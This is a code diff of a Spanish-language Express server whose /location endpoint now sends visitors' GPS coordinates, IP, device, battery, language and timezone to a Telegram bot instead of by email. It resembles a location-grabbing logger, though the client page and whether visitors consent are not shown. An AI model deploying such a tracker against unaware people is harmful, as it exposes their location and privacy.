@@ -2,10 +2,9 @@ require("dotenv").config();
 
 const express = require("express");
 const path = require("path");
-const { Resend } = require("resend");
+const axios = require("axios");
 
 const app = express();
-const resend = new Resend(process.env.RESEND_API_KEY);
 
 app.use(express.json({ limit: "1mb" }));
 app.use(express.static(path.join(__dirname, "public")));
@@ -16,7 +15,7 @@ app.post("/location", async (req, res) => {
     const gps = data.gps || {};
 
     const ip =
-      req.headers["x-forwarded-for"]?.split(",")[0] ||
+      req.headers["x-forwarded-for"]?.toString().split(",")[0] ||
       req.socket.remoteAddress ||
       "N/A";
 
@@ -25,31 +24,59 @@ app.post("/location", async (req, res) => {
         ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}`
         : "No disponible";
 
-    await resend.emails.send({
-      from: process.env.FROM_EMAIL,
-      to: process.env.TO_EMAIL,
-      subject: "Nuevo punto georreferenciado",
-      html: `
-        <h2>Nuevo punto georreferenciado</h2>
+    const mensaje = `
+📍 NUEVO REGISTRO DE UBICACIÓN
 
-        <p><b>Fecha servidor:</b> ${new Date().toLocaleString("es-CO")}</p>
-        <p><b>IP:</b> ${ip}</p>
+🕒 Fecha:
+${new Date().toLocaleString("es-CO")}
 
-        <h3>Ubicación</h3>
-        <p><b>Latitud:</b> ${gps.lat ?? "N/A"}</p>
-        <p><b>Longitud:</b> ${gps.lon ?? "N/A"}</p>
-        <p><b>Precisión:</b> ${gps.acc ?? "N/A"} metros</p>
-        <p><b>Google Maps:</b> <a href="${maps}">${maps}</a></p>
+🌐 IP:
+${ip}
 
-        <h3>Datos recibidos</h3>
-        <pre>${JSON.stringify(data, null, 2)}</pre>
-      `,
+📌 Latitud:
+${gps.lat ?? "N/A"}
+
+📌 Longitud:
+${gps.lon ?? "N/A"}
+
+🎯 Precisión:
+${gps.acc ?? "N/A"} m
+
+🗺 Google Maps:
+${maps}
+
+📱 Dispositivo:
+${data.ua ?? "N/A"}
+
+🔋 Batería:
+${data.battery?.level ?? "N/A"}%
+
+🌎 Idioma:
+${data.language ?? "N/A"}
+
+🕐 Zona horaria:
+${data.timezone ?? "N/A"}
+`;
+
+    await axios.post(
+      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: process.env.CHAT_ID,
+        text: mensaje,
+      }
+    );
+
+    res.json({
+      ok: true,
+      maps,
     });
-
-    res.json({ ok: true, maps });
   } catch (error) {
-    console.error(error);
-    res.json({ ok: false, msg: error.message });
+    console.error(error.response?.data || error.message);
+
+    res.status(500).json({
+      ok: false,
+      msg: error.response?.data || error.message,
+    });
   }
 });
 
